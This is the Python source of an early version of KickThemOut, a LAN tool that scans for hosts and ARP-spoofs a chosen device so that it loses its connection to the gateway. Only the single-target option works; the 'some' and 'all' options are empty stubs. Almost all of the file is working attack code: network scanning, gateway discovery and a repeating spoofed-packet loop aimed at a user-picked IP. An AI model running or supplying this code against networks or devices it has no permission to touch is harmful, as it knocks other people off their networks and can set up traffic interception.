#!/usr/bin/env python
# -.- coding: utf-8 -.-
# kickthemout.py

"""
Copyright (C) 2016 Nikolaos Kamarinakis (nikolaskam@gmail.com)
See License at nikolaskama.me (https://nikolaskama.me/kickthemoutproject)
"""

import time, os, sys, logging
from time import sleep
from scapy.all import *
import math

import scan
import spoof

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

def heading():
    print(GREEN + """
    █  █▀ ▄█ ▄█▄    █  █▀    ▄▄▄▄▀  ▄  █ ▄███▄   █▀▄▀█  ████▄   ▄      ▄▄▄▄▀
    █▄█   ██ █▀ ▀▄  █▄█   ▀▀▀ █    █   █ █▀   ▀  █ █ █  █   █    █  ▀▀▀ █
    █▀▄   ██ █   ▀  █▀▄       █    ██▀▀█ ██▄▄    █ ▄ █  █   █ █   █     █
    █  █  ▐█ █▄  ▄▀ █  █     █     █   █ █▄   ▄▀ █   █  ▀████ █   █    █
     █    ▐ ▀███▀    █     ▀         █  ▀███▀      █         █▄ ▄█   ▀
     ▀               ▀               ▀             ▀           ▀▀▀
    """  + END + BLUE +
    '\n' + '{0}Kick Devices Off Your LAN ({1}KickThemOut{2}){3}'.format(YELLOW, RED, YELLOW, BLUE).center(88) +
    '\n' + 'Made With <3 by: {0}Nikolaos Kamarinakis ({1}k4m4{2}){3}'.format(YELLOW, RED, YELLOW, BLUE).center(87) +
    '\n' + 'Version: {0}0.1{1}'.format(YELLOW, END).center(77))

def optionBanner():
    print('\nChoose option from menu:\n')
    print('\t{0}[{1}1{2}]{3} Kick ONE Off').format(YELLOW, RED, YELLOW, WHITE)
    sleep(0.2)
    print('\t{0}[{1}2{2}]{3} Kick SOME Off').format(YELLOW, RED, YELLOW, WHITE)
    sleep(0.2)
    print('\t{0}[{1}3{2}]{3} Kick ALL Off').format(YELLOW, RED, YELLOW, WHITE)
    sleep(0.2)
    print('\n\t{0}[{1}E{2}]{3} Exit KickThemOut\n').format(YELLOW, RED, YELLOW, WHITE)

def kickoneoff():
    os.system("clear||cls")
    global defaultInterface
    global defaultInterfaceMac
    global defaultGatewayIP
    global defaultGatewayMac
    global hostsList
    global onlineIPs

    print ""
    print ("{0}kickONEOff{1} selected...{2}").format(RED, GREEN, END)
    print ""
    scanNetwork()
    print "Online IPs: "
    for ip in onlineIPs:
        print ("    {0}" + ip + "{1}").format(RED, END)

    print ""
    one_target_ip = raw_input("IP of the target: ")
    one_target_mac = ""
    for host in hostsList:
        if host[0] == one_target_ip:
            one_target_mac = host[1]
    if one_target_mac == "":
        print ""
        print("IP address is not up. Please try again.")
        return

    print ""
    print("{0}Target mac => '{1}" + one_target_mac + "{2}'{3}").format(GREEN, RED, GREEN, END)
    print ""
    print("{0}Spoofing started... {1}(press CTRL + C to stop)").format(GREEN, END)
    print ""
    try:
        while True:
            spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, one_target_ip, one_target_mac)
            time.sleep(15)
    except KeyboardInterrupt:
        print ""
        print("{0}Re-arping{1} target...{2}").format(RED, GREEN, END)
        rearp = 1
        while rearp != 10:
            spoof.sendPacket(defaultGatewayMac, defaultGatewayIP, one_target_ip, one_target_mac)
            rearp = rearp + 1
            time.sleep(0.5)
        print ""
        print("{0}Done.{1}").format(GREEN, END)

def kicksomeoff():
    print('kicksomeoff')

def kickalloff():
    print('kickalloff')

def scanNetwork():
    global hostsList
    hostsList = scan.scanNetwork()

def getDefaultInterface():
    def long2net(arg):
        if (arg <= 0 or arg >= 0xFFFFFFFF):
            raise ValueError("illegal netmask value", hex(arg))
        return 32 - int(round(math.log(0xFFFFFFFF - arg, 2)))

    def to_CIDR_notation(bytes_network, bytes_netmask):
        network = scapy.utils.ltoa(bytes_network)
        netmask = long2net(bytes_netmask)
        net = "%s/%s" % (network, netmask)
        if netmask < 16:
            return None

        return net

    for network, netmask, _, interface, address in scapy.config.conf.route.routes:

        # skip loopback network and default gw
        if network == 0 or interface == 'lo' or address == '127.0.0.1' or address == '0.0.0.0':
            continue

        if netmask <= 0 or netmask == 0xFFFFFFFF:
            continue

        net = to_CIDR_notation(network, netmask)

        if interface != scapy.config.conf.iface:
            continue

        if net:
            return interface

def getGatewayIP():
    getGateway_p = sr1(IP(dst="google.com", ttl=0) / ICMP() / "XXXXXXXXXXX", verbose=False)
    return getGateway_p.src

def main():

    heading()

    global defaultInterface
    global defaultInterfaceMac
    global defaultGatewayIP
    global defaultGatewayMac
    global hostsList
    global onlineIPs

    defaultInterface = getDefaultInterface()
    defaultGatewayIP = getGatewayIP()
    defaultInterfaceMac = get_if_hwaddr(defaultInterface)
    scanNetwork()
    onlineIPs = []
    for host in hostsList:
        onlineIPs.append(host[0])
        if host[0] == defaultGatewayIP:
            defaultGatewayMac = host[1]

    print("\n{0}Using interface '{1}"+defaultInterface+"{2}' with mac address '{3}"+defaultInterfaceMac+"{4}'.\nGateway IP: '{5}"
          + defaultGatewayIP + "{6}'. {7}" + str(len(hostsList)) + "{8} hosts are up.{9}").format(GREEN, RED, GREEN, RED, GREEN, RED, GREEN, RED, GREEN, END)

    try:

        while True:

            optionBanner()

            header = ('{0}kickthemout{1}> {2}'.format(BLUE, WHITE, END))
            choice = raw_input(header)

            if choice.upper() == 'E' or choice.upper() == 'EXIT':
                print('Thanks for dropping by!')
                print('Catch ya later!')
                raise SystemExit
            elif choice == '1':
                kickoneoff()
                # EXECUTE kickoneoff FUNCTION (SCAN & PARSE)
            elif choice == '2':
                kicksomeoff()
                # EXECUTE kicksomeoff FUNCTION
            elif choice == '3':
                kickalloff()
                # EXECUTE kickalloff FUNCTION (FF:FF:FF:FF:FF:FF)
            elif choice.upper() == 'CLEAR':
                os.system("clear||cls")
            #else:
                #print('*INVALID OPTION*')

    except KeyboardInterrupt:
        print('\nThanks for dropping by.'
              '\nCatch ya later!{0}').format(END)


if __name__ == '__main__':
    main()
